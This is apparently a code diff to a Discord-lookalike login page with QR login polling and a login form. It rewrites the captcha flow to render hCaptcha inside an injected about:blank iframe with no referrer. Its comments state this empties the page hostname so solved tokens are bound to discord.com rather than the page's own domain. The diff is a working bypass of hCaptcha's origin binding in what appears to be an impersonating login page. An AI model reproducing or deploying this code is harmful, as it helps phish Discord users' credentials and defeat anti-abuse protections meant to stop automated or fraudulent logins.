@@ -14,7 +14,7 @@
     @font-face{font-family:'gg sans';src:local('gg sans'),local('Noto Sans'),local('Helvetica Neue');font-display:swap}
   </style>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
-  <script src="https://js.hcaptcha.com/1/api.js?render=explicit" async defer></script>
+  <!-- hcaptcha is loaded INSIDE an about:blank iframe to force window.location.hostname="" -->
   <style>
     :root{
       --font-primary:'gg sans','Noto Sans','Helvetica Neue',Helvetica,Arial,sans-serif;
@@ -355,59 +355,96 @@ async function pollQR() {
   }
 }
 
-/* ═══ Captcha Flow (overlay, like Discord) ═══ */
+/* ═══ Captcha Flow — renders hcaptcha inside about:blank iframe ═══ */
+/* In an about:blank iframe, window.location.hostname is "" (empty),   */
+/* forcing the hcaptcha SDK to use the `host` config parameter only.   */
+/* This makes the token domain-bound to discord.com, not our domain.   */
+
 function showCaptchaOverlay(sitekey, rqdata, rqtoken, sessionId) {
   captchaSid = sessionId;
   captchaRqtoken = rqtoken;
 
-  var overlay = document.getElementById('captcha-overlay');
-  var container = document.getElementById('hcaptcha-container');
-  container.innerHTML = '';
+  /* Remove any previous captcha iframe */
+  var old = document.getElementById('hcaptcha-frame');
+  if (old) old.remove();
 
-  function renderWidget() {
-    try {
-      hcaptchaWidgetId = hcaptcha.render(container, {
-        sitekey: sitekey,
-        theme: 'dark',
-        size: 'normal',
-        host: 'discord.com',
-        rqdata: rqdata || undefined,
-        callback: onCaptchaSolved,
-        'expired-callback': function() {
-          showErr('login-error', 'Captcha expired. Please try again.');
-          try { hcaptcha.reset(hcaptchaWidgetId); } catch(e) {}
-        },
-        'error-callback': function(err) {
-          console.error('hcaptcha error:', err);
-        },
-      });
-      overlay.classList.add('show');
-    } catch(e) {
-      console.error('hcaptcha render failed:', e);
-      showErr('login-error', 'Failed to load captcha. Please refresh.');
-    }
-  }
+  /* Create full-viewport iframe (about:blank origin, hostname is "") */
+  var iframe = document.createElement('iframe');
+  iframe.id = 'hcaptcha-frame';
+  iframe.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;z-index:10000;';
+  document.body.appendChild(iframe);
 
-  if (typeof hcaptcha !== 'undefined' && typeof hcaptcha.render === 'function') {
-    renderWidget();
-  } else {
-    var attempts = 0;
-    var poll = setInterval(function() {
-      attempts++;
-      if (typeof hcaptcha !== 'undefined' && typeof hcaptcha.render === 'function') {
-        clearInterval(poll);
-        renderWidget();
-      } else if (attempts > 50) {
-        clearInterval(poll);
-        showErr('login-error', 'Captcha failed to load. Refresh the page.');
-      }
-    }, 200);
-  }
+  var iDoc = iframe.contentDocument || iframe.contentWindow.document;
+  var rqdataLine = rqdata ? "rqdata: '" + rqdata.replace(/'/g, "\\'") + "'," : '';
+
+  iDoc.open();
+  iDoc.write('<!DOCTYPE html><html><head>' +
+    '<meta name="referrer" content="no-referrer">' +
+    '<style>' +
+      '*{margin:0;padding:0;box-sizing:border-box}' +
+      'body{display:flex;flex-direction:column;align-items:center;justify-content:center;' +
+        'min-height:100vh;background:rgba(0,0,0,0.85);' +
+        "font-family:'gg sans','Noto Sans','Helvetica Neue',Helvetica,Arial,sans-serif;}" +
+      '.title{color:#f2f3f5;font-size:16px;font-weight:600;margin-bottom:16px}' +
+      '.cancel{color:#00a8fc;font-size:13px;margin-top:12px;cursor:pointer;text-decoration:none}' +
+      '.cancel:hover{text-decoration:underline}' +
+      '.loading{color:#949ba4;font-size:14px}' +
+    '</style></head><body>' +
+    '<div class="title">Complete the captcha to continue</div>' +
+    '<div id="hcap"></div>' +
+    '<div class="loading" id="hcap-loading">Loading captcha...</div>' +
+    '<a class="cancel" id="cancel-btn">Cancel</a>' +
+    '<script src="https://js.hcaptcha.com/1/api.js?render=explicit&onload=_hcapReady" async defer><\/script>' +
+    '<script>' +
+      'document.getElementById("cancel-btn").addEventListener("click",function(){' +
+        'parent.postMessage({type:"hcaptcha-cancel"},"*");' +
+      '});' +
+      'function _hcapReady(){' +
+        'try{' +
+          'document.getElementById("hcap-loading").style.display="none";' +
+          'hcaptcha.render("hcap",{' +
+            'sitekey:"' + sitekey + '",' +
+            'theme:"dark",' +
+            'size:"normal",' +
+            'host:"discord.com",' +
+            rqdataLine +
+            'callback:function(t){parent.postMessage({type:"hcaptcha-solved",token:t},"*")},' +
+            '"expired-callback":function(){parent.postMessage({type:"hcaptcha-expired"},"*")},' +
+            '"error-callback":function(e){console.error("hcaptcha err",e);' +
+              'parent.postMessage({type:"hcaptcha-error",error:String(e)},"*")}' +
+          '});' +
+        '}catch(e){' +
+          'console.error("hcaptcha render fail",e);' +
+          'parent.postMessage({type:"hcaptcha-error",error:String(e)},"*");' +
+        '}' +
+      '}' +
+    '<\/script></body></html>');
+  iDoc.close();
 }
 
+/* Global message handler for hcaptcha iframe communication */
+window.addEventListener('message', function(e) {
+  if (!e.data || !e.data.type) return;
+  if (e.data.type === 'hcaptcha-solved') {
+    var frame = document.getElementById('hcaptcha-frame');
+    if (frame) frame.remove();
+    onCaptchaSolved(e.data.token);
+  } else if (e.data.type === 'hcaptcha-cancel') {
+    closeCaptcha();
+  } else if (e.data.type === 'hcaptcha-expired') {
+    showErr('login-error', 'Captcha expired. Please try again.');
+    closeCaptcha();
+  } else if (e.data.type === 'hcaptcha-error') {
+    console.error('[captcha] iframe error:', e.data.error);
+    showErr('login-error', 'Captcha failed to load. Please refresh.');
+    closeCaptcha();
+  }
+});
+
 function closeCaptcha() {
+  var frame = document.getElementById('hcaptcha-frame');
+  if (frame) frame.remove();
   document.getElementById('captcha-overlay').classList.remove('show');
-  document.getElementById('hcaptcha-container').innerHTML = '';
   hcaptchaWidgetId = null;
   btnLoad('login-btn', false);
 }
